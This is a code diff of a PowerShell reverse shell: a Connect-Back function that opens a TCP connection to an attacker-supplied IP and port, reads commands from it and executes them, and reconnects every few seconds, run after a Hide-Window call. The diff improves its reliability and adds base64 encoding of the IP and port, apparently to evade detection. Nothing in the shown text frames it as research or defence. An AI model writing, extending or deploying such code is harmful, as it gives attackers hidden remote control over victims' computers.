@@ -39,13 +39,14 @@ function Connect-Back {
         [string]$ip,
         [int]$port
     )
-    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-    $stream = $client.GetStream()
-    $writer = New-Object System.IO.StreamWriter($stream)
-    $reader = New-Object System.IO.StreamReader($stream)
-
     try {
-        while ($true) {
+        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
+        
+        # Read and execute commands
+        while ($client.Connected) {
             $data = $reader.ReadLine()
             if ($data) {
                 try {
@@ -62,12 +63,28 @@ function Connect-Back {
         Start-Sleep -Seconds 5
         Connect-Back -ip $ip -port $port
     } finally {
-        $writer.Close()
-        $reader.Close()
-        $client.Close()
+        if ($client.Connected) {
+            $writer.Close()
+            $reader.Close()
+            $client.Close()
+        }
     }
+}
+
+function Obfuscate-String {
+    param ([string]$input)
+    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($input))
+    return $encoded
+}
+
+function Deobfuscate-String {
+    param ([string]$input)
+    $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($input))
+    return $decoded
 }
 
 # Main execution
 Hide-Window
-Connect-Back -ip $ip -port $port
+$encodedIp = Obfuscate-String $ip
+$encodedPort = Obfuscate-String $port.ToString()
+Connect-Back -ip (Deobfuscate-String $encodedIp) -port ([int] (Deobfuscate-String $encodedPort))
